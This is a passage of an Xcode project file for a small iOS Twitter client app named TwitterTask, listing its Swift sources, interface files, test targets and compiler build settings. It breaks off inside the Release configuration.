// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 50;
	objects = {

/* Begin PBXBuildFile section */
		F3E5EFA8240E31AA00AD9DF4 /* TwitterTaskUITests.swift in Sources */ = {isa = PBXBuildFile; fileRef = F3E5EFA7240E31AA00AD9DF4 /* TwitterTaskUITests.swift */; };
		F3E5EFB6240E45BC00AD9DF4 /* TwitterTaskTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = F3E5EFB5240E45BC00AD9DF4 /* TwitterTaskTests.swift */; };
		F89344C8240A72B4007DDC28 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = F89344C7240A72B4007DDC28 /* AppDelegate.swift */; };
		F89344CD240A72B4007DDC28 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = F89344CB240A72B4007DDC28 /* Main.storyboard */; };
		F89344CF240A72B9007DDC28 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = F89344CE240A72B9007DDC28 /* Assets.xcassets */; };
		F89344D2240A72B9007DDC28 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = F89344D0240A72B9007DDC28 /* LaunchScreen.storyboard */; };
		F89344DB240AB99F007DDC28 /* SearchData.swift in Sources */ = {isa = PBXBuildFile; fileRef = F89344DA240AB99F007DDC28 /* SearchData.swift */; };
		F89344F0240ABA8C007DDC28 /* WebService.swift in Sources */ = {isa = PBXBuildFile; fileRef = F89344EF240ABA8C007DDC28 /* WebService.swift */; };
		F89344F5240ABAD1007DDC28 /* APIList.swift in Sources */ = {isa = PBXBuildFile; fileRef = F89344F4240ABAD1007DDC28 /* APIList.swift */; };
		F89344F7240ABAED007DDC28 /* TweetsController.swift in Sources */ = {isa = PBXBuildFile; fileRef = F89344F6240ABAED007DDC28 /* TweetsController.swift */; };
		F89344F9240ABCD9007DDC28 /* Constants.swift in Sources */ = {isa = PBXBuildFile; fileRef = F89344F8240ABCD9007DDC28 /* Constants.swift */; };
		F89344FB240ACBFF007DDC28 /* Extensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = F89344FA240ACBFF007DDC28 /* Extensions.swift */; };
		F89344FD240ACD53007DDC28 /* AppManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = F89344FC240ACD53007DDC28 /* AppManager.swift */; };
		F89344FF240ADBE6007DDC28 /* AuthData.swift in Sources */ = {isa = PBXBuildFile; fileRef = F89344FE240ADBE6007DDC28 /* AuthData.swift */; };
		F8934503240AE88D007DDC28 /* TweetCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = F8934501240AE88D007DDC28 /* TweetCell.swift */; };
		F8934504240AE88D007DDC28 /* TweetCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = F8934502240AE88D007DDC28 /* TweetCell.xib */; };
		F8934506240AF7BF007DDC28 /* EmptyData.swift in Sources */ = {isa = PBXBuildFile; fileRef = F8934505240AF7BF007DDC28 /* EmptyData.swift */; };
		F893450C240AF8B8007DDC28 /* UserDetailCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = F893450A240AF8B8007DDC28 /* UserDetailCell.swift */; };
		F893450D240AF8B8007DDC28 /* UserDetailCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = F893450B240AF8B8007DDC28 /* UserDetailCell.xib */; };
		F893450F240AFB1D007DDC28 /* UserDetailController.swift in Sources */ = {isa = PBXBuildFile; fileRef = F893450E240AFB1D007DDC28 /* UserDetailController.swift */; };
		F8934511240AFCDD007DDC28 /* TimelineData.swift in Sources */ = {isa = PBXBuildFile; fileRef = F8934510240AFCDD007DDC28 /* TimelineData.swift */; };
/* End PBXBuildFile section */

/* Begin PBXContainerItemProxy section */
		F3E5EFAA240E31AA00AD9DF4 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = F89344BC240A72B4007DDC28 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = F89344C3240A72B4007DDC28;
			remoteInfo = TwitterTask;
		};
		F3E5EFB8240E45BC00AD9DF4 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = F89344BC240A72B4007DDC28 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = F89344C3240A72B4007DDC28;
			remoteInfo = TwitterTask;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXFileReference section */
		F3E5EFA5240E31AA00AD9DF4 /* TwitterTaskUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = TwitterTaskUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		F3E5EFA7240E31AA00AD9DF4 /* TwitterTaskUITests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TwitterTaskUITests.swift; sourceTree = "<group>"; };
		F3E5EFA9240E31AA00AD9DF4 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		F3E5EFB3240E45BC00AD9DF4 /* TwitterTaskTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = TwitterTaskTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
		F3E5EFB5240E45BC00AD9DF4 /* TwitterTaskTests.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TwitterTaskTests.swift; sourceTree = "<group>"; };
		F3E5EFB7240E45BC00AD9DF4 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		F89344C4240A72B4007DDC28 /* TwitterTask.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = TwitterTask.app; sourceTree = BUILT_PRODUCTS_DIR; };
		F89344C7240A72B4007DDC28 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		F89344CC240A72B4007DDC28 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		F89344CE240A72B9007DDC28 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		F89344D1240A72B9007DDC28 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		F89344D3240A72B9007DDC28 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		F89344DA240AB99F007DDC28 /* SearchData.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SearchData.swift; sourceTree = "<group>"; };
		F89344EF240ABA8C007DDC28 /* WebService.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = WebService.swift; sourceTree = "<group>"; };
		F89344F4240ABAD1007DDC28 /* APIList.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APIList.swift; sourceTree = "<group>"; };
		F89344F6240ABAED007DDC28 /* TweetsController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TweetsController.swift; sourceTree = "<group>"; };
		F89344F8240ABCD9007DDC28 /* Constants.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Constants.swift; sourceTree = "<group>"; };
		F89344FA240ACBFF007DDC28 /* Extensions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Extensions.swift; sourceTree = "<group>"; };
		F89344FC240ACD53007DDC28 /* AppManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppManager.swift; sourceTree = "<group>"; };
		F89344FE240ADBE6007DDC28 /* AuthData.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AuthData.swift; sourceTree = "<group>"; };
		F8934501240AE88D007DDC28 /* TweetCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TweetCell.swift; sourceTree = "<group>"; };
		F8934502240AE88D007DDC28 /* TweetCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = TweetCell.xib; sourceTree = "<group>"; };
		F8934505240AF7BF007DDC28 /* EmptyData.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EmptyData.swift; sourceTree = "<group>"; };
		F893450A240AF8B8007DDC28 /* UserDetailCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserDetailCell.swift; sourceTree = "<group>"; };
		F893450B240AF8B8007DDC28 /* UserDetailCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = UserDetailCell.xib; sourceTree = "<group>"; };
		F893450E240AFB1D007DDC28 /* UserDetailController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserDetailController.swift; sourceTree = "<group>"; };
		F8934510240AFCDD007DDC28 /* TimelineData.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TimelineData.swift; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		F3E5EFA2240E31AA00AD9DF4 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		F3E5EFB0240E45BC00AD9DF4 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		F89344C1240A72B4007DDC28 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		F3E5EFA6240E31AA00AD9DF4 /* TwitterTaskUITests */ = {
			isa = PBXGroup;
			children = (
				F3E5EFA7240E31AA00AD9DF4 /* TwitterTaskUITests.swift */,
				F3E5EFA9240E31AA00AD9DF4 /* Info.plist */,
			);
			path = TwitterTaskUITests;
			sourceTree = "<group>";
		};
		F3E5EFB4240E45BC00AD9DF4 /* TwitterTaskTests */ = {
			isa = PBXGroup;
			children = (
				F3E5EFB5240E45BC00AD9DF4 /* TwitterTaskTests.swift */,
				F3E5EFB7240E45BC00AD9DF4 /* Info.plist */,
			);
			path = TwitterTaskTests;
			sourceTree = "<group>";
		};
		F89344BB240A72B4007DDC28 = {
			isa = PBXGroup;
			children = (
				F89344C6240A72B4007DDC28 /* TwitterTask */,
				F3E5EFA6240E31AA00AD9DF4 /* TwitterTaskUITests */,
				F3E5EFB4240E45BC00AD9DF4 /* TwitterTaskTests */,
				F89344C5240A72B4007DDC28 /* Products */,
			);
			sourceTree = "<group>";
		};
		F89344C5240A72B4007DDC28 /* Products */ = {
			isa = PBXGroup;
			children = (
				F89344C4240A72B4007DDC28 /* TwitterTask.app */,
				F3E5EFA5240E31AA00AD9DF4 /* TwitterTaskUITests.xctest */,
				F3E5EFB3240E45BC00AD9DF4 /* TwitterTaskTests.xctest */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		F89344C6240A72B4007DDC28 /* TwitterTask */ = {
			isa = PBXGroup;
			children = (
				F89344C7240A72B4007DDC28 /* AppDelegate.swift */,
				F89344EE240ABA77007DDC28 /* Webservice */,
				F89344D9240AB96B007DDC28 /* Model */,
				F89344F2240ABAAE007DDC28 /* View */,
				F89344F3240ABABA007DDC28 /* Controller */,
				F89344F1240ABA9E007DDC28 /* Resources */,
				F89344CE240A72B9007DDC28 /* Assets.xcassets */,
				F89344D0240A72B9007DDC28 /* LaunchScreen.storyboard */,
				F89344D3240A72B9007DDC28 /* Info.plist */,
			);
			path = TwitterTask;
			sourceTree = "<group>";
		};
		F89344D9240AB96B007DDC28 /* Model */ = {
			isa = PBXGroup;
			children = (
				F89344DA240AB99F007DDC28 /* SearchData.swift */,
				F89344FE240ADBE6007DDC28 /* AuthData.swift */,
				F8934510240AFCDD007DDC28 /* TimelineData.swift */,
			);
			path = Model;
			sourceTree = "<group>";
		};
		F89344EE240ABA77007DDC28 /* Webservice */ = {
			isa = PBXGroup;
			children = (
				F89344EF240ABA8C007DDC28 /* WebService.swift */,
			);
			path = Webservice;
			sourceTree = "<group>";
		};
		F89344F1240ABA9E007DDC28 /* Resources */ = {
			isa = PBXGroup;
			children = (
				F89344F4240ABAD1007DDC28 /* APIList.swift */,
				F89344F8240ABCD9007DDC28 /* Constants.swift */,
				F89344FA240ACBFF007DDC28 /* Extensions.swift */,
				F89344FC240ACD53007DDC28 /* AppManager.swift */,
				F8934505240AF7BF007DDC28 /* EmptyData.swift */,
			);
			path = Resources;
			sourceTree = "<group>";
		};
		F89344F2240ABAAE007DDC28 /* View */ = {
			isa = PBXGroup;
			children = (
				F8934500240AE877007DDC28 /* Cell */,
				F89344CB240A72B4007DDC28 /* Main.storyboard */,
			);
			path = View;
			sourceTree = "<group>";
		};
		F89344F3240ABABA007DDC28 /* Controller */ = {
			isa = PBXGroup;
			children = (
				F89344F6240ABAED007DDC28 /* TweetsController.swift */,
				F893450E240AFB1D007DDC28 /* UserDetailController.swift */,
			);
			path = Controller;
			sourceTree = "<group>";
		};
		F8934500240AE877007DDC28 /* Cell */ = {
			isa = PBXGroup;
			children = (
				F8934508240AF88F007DDC28 /* UserDetailCell */,
				F8934507240AF874007DDC28 /* TweetCell */,
			);
			path = Cell;
			sourceTree = "<group>";
		};
		F8934507240AF874007DDC28 /* TweetCell */ = {
			isa = PBXGroup;
			children = (
				F8934501240AE88D007DDC28 /* TweetCell.swift */,
				F8934502240AE88D007DDC28 /* TweetCell.xib */,
			);
			path = TweetCell;
			sourceTree = "<group>";
		};
		F8934508240AF88F007DDC28 /* UserDetailCell */ = {
			isa = PBXGroup;
			children = (
				F893450A240AF8B8007DDC28 /* UserDetailCell.swift */,
				F893450B240AF8B8007DDC28 /* UserDetailCell.xib */,
			);
			path = UserDetailCell;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		F3E5EFA4240E31AA00AD9DF4 /* TwitterTaskUITests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = F3E5EFAE240E31AA00AD9DF4 /* Build configuration list for PBXNativeTarget "TwitterTaskUITests" */;
			buildPhases = (
				F3E5EFA1240E31AA00AD9DF4 /* Sources */,
				F3E5EFA2240E31AA00AD9DF4 /* Frameworks */,
				F3E5EFA3240E31AA00AD9DF4 /* Resources */,
			);
			buildRules = (
				3F708E50247A0EB6004066FD /* PBXBuildRule */,
			);
			dependencies = (
				F3E5EFAB240E31AA00AD9DF4 /* PBXTargetDependency */,
			);
			name = TwitterTaskUITests;
			productName = TwitterTaskUITests;
			productReference = F3E5EFA5240E31AA00AD9DF4 /* TwitterTaskUITests.xctest */;
			productType = "com.apple.product-type.bundle.ui-testing";
		};
		F3E5EFB2240E45BC00AD9DF4 /* TwitterTaskTests */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = F3E5EFBA240E45BC00AD9DF4 /* Build configuration list for PBXNativeTarget "TwitterTaskTests" */;
			buildPhases = (
				F3E5EFAF240E45BC00AD9DF4 /* Sources */,
				F3E5EFB0240E45BC00AD9DF4 /* Frameworks */,
				F3E5EFB1240E45BC00AD9DF4 /* Resources */,
			);
			buildRules = (
				3F708E50247A0EB6004066FD /* PBXBuildRule */,
			);
			dependencies = (
				F3E5EFB9240E45BC00AD9DF4 /* PBXTargetDependency */,
			);
			name = TwitterTaskTests;
			productName = TwitterTaskTests;
			productReference = F3E5EFB3240E45BC00AD9DF4 /* TwitterTaskTests.xctest */;
			productType = "com.apple.product-type.bundle.unit-test";
		};
		F89344C3240A72B4007DDC28 /* TwitterTask */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = F89344D6240A72B9007DDC28 /* Build configuration list for PBXNativeTarget "TwitterTask" */;
			buildPhases = (
				F89344C0240A72B4007DDC28 /* Sources */,
				F89344C1240A72B4007DDC28 /* Frameworks */,
				F89344C2240A72B4007DDC28 /* Resources */,
			);
			buildRules = (
				3F708E50247A0EB6004066FD /* PBXBuildRule */,
			);
			dependencies = (
			);
			name = TwitterTask;
			productName = TwitterTask;
			productReference = F89344C4240A72B4007DDC28 /* TwitterTask.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		F89344BC240A72B4007DDC28 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 1130;
				LastUpgradeCheck = 1030;
				ORGANIZATIONNAME = Ansar;
				TargetAttributes = {
					F3E5EFA4240E31AA00AD9DF4 = {
						CreatedOnToolsVersion = 11.3.1;
						TestTargetID = F89344C3240A72B4007DDC28;
					};
					F3E5EFB2240E45BC00AD9DF4 = {
						CreatedOnToolsVersion = 11.3.1;
						TestTargetID = F89344C3240A72B4007DDC28;
					};
					F89344C3240A72B4007DDC28 = {
						CreatedOnToolsVersion = 10.3;
					};
				};
			};
			buildConfigurationList = F89344BF240A72B4007DDC28 /* Build configuration list for PBXProject "TwitterTask" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = F89344BB240A72B4007DDC28;
			productRefGroup = F89344C5240A72B4007DDC28 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				F89344C3240A72B4007DDC28 /* TwitterTask */,
				F3E5EFA4240E31AA00AD9DF4 /* TwitterTaskUITests */,
				F3E5EFB2240E45BC00AD9DF4 /* TwitterTaskTests */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		F3E5EFA3240E31AA00AD9DF4 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		F3E5EFB1240E45BC00AD9DF4 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		F89344C2240A72B4007DDC28 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				F893450D240AF8B8007DDC28 /* UserDetailCell.xib in Resources */,
				F89344D2240A72B9007DDC28 /* LaunchScreen.storyboard in Resources */,
				F89344CF240A72B9007DDC28 /* Assets.xcassets in Resources */,
				F89344CD240A72B4007DDC28 /* Main.storyboard in Resources */,
				F8934504240AE88D007DDC28 /* TweetCell.xib in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		F3E5EFA1240E31AA00AD9DF4 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				F3E5EFA8240E31AA00AD9DF4 /* TwitterTaskUITests.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		F3E5EFAF240E45BC00AD9DF4 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				F3E5EFB6240E45BC00AD9DF4 /* TwitterTaskTests.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		F89344C0240A72B4007DDC28 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				F89344F0240ABA8C007DDC28 /* WebService.swift in Sources */,
				F89344DB240AB99F007DDC28 /* SearchData.swift in Sources */,
				F89344FB240ACBFF007DDC28 /* Extensions.swift in Sources */,
				F89344F5240ABAD1007DDC28 /* APIList.swift in Sources */,
				F8934506240AF7BF007DDC28 /* EmptyData.swift in Sources */,
				F89344FF240ADBE6007DDC28 /* AuthData.swift in Sources */,
				F893450F240AFB1D007DDC28 /* UserDetailController.swift in Sources */,
				F89344C8240A72B4007DDC28 /* AppDelegate.swift in Sources */,
				F8934511240AFCDD007DDC28 /* TimelineData.swift in Sources */,
				F89344F7240ABAED007DDC28 /* TweetsController.swift in Sources */,
				F8934503240AE88D007DDC28 /* TweetCell.swift in Sources */,
				F893450C240AF8B8007DDC28 /* UserDetailCell.swift in Sources */,
				F89344F9240ABCD9007DDC28 /* Constants.swift in Sources */,
				F89344FD240ACD53007DDC28 /* AppManager.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		F3E5EFAB240E31AA00AD9DF4 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = F89344C3240A72B4007DDC28 /* TwitterTask */;
			targetProxy = F3E5EFAA240E31AA00AD9DF4 /* PBXContainerItemProxy */;
		};
		F3E5EFB9240E45BC00AD9DF4 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = F89344C3240A72B4007DDC28 /* TwitterTask */;
			targetProxy = F3E5EFB8240E45BC00AD9DF4 /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin PBXVariantGroup section */
		F89344CB240A72B4007DDC28 /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				F89344CC240A72B4007DDC28 /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
		F89344D0240A72B9007DDC28 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				F89344D1240A72B9007DDC28 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		F3E5EFAC240E31AA00AD9DF4 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = TwitterTaskUITests/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 13.2;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.simpragma.TwitterTaskUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = TwitterTask;
			};
			name = Debug;
		};
		F3E5EFAD240E31AA00AD9DF4 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = TwitterTaskUITests/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 13.2;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.simpragma.TwitterTaskUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = TwitterTask;
			};
			name = Release;
		};
		F3E5EFBB240E45BC00AD9DF4 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = TwitterTaskTests/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 13.2;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.simpragma.TwitterTaskTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/TwitterTask.app/TwitterTask";
			};
			name = Debug;
		};
		F3E5EFBC240E45BC00AD9DF4 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				INFOPLIST_FILE = TwitterTaskTests/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 13.2;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.simpragma.TwitterTaskTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/TwitterTask.app/TwitterTask";
			};
			name = Release;
		};
		F89344D4240A72B9007DDC28 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				CODE_SIGN_IDENTITY = "iPhone Developer";
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 12.4;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		F89344D5240A72B9007DDC28 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				CODE_SIGN_IDENTITY = "iPhone Developer";
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
